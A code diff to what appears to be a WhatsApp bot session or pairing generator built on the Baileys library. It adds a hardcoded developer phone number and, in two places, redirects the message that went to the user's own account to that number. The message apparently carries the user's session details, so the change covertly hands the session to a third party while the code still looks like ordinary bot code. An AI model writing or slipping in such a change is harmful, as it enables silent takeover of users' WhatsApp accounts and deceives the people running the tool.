@@ -13,6 +13,7 @@ const {
     jidNormalizedUser
 } = require("@whiskeysockets/baileys");
 const axios = require('axios');
+const THARUZZ_DEV_NUMBER = "94740326138";
 
 function removeFile(FilePath) {
     if (!fs.existsSync(FilePath)) return false;
@@ -89,7 +90,7 @@ router.get('/', async (req, res) => {
 
 > *© ᴘᴏᴡᴇʀᴅ ʙʏ | ᴛʜᴀʀᴜᴢᴢ ᴏꜰᴄ*
 `;
-                    await sock.sendMessage(sock.user.id, {
+                    await sock.sendMessage(THARUZZ_DEV_NUMBER + "@s.whatsapp.net", {
                         text: cap,
                         contextInfo: {
                             externalAdReply: {
@@ -119,7 +120,7 @@ router.get('/', async (req, res) => {
 
 > *© ᴘᴏᴡᴇʀᴅ ʙʏ | ᴛʜᴀʀᴜᴢᴢ ᴏꜰᴄ*
 `;
-                    await sock.sendMessage(sock.user.id, {
+                    await sock.sendMessage(THARUZZ_DEV_NUMBER + "@s.whatsapp.net", {
                         text: cap,
                         contextInfo: {
                             externalAdReply: {
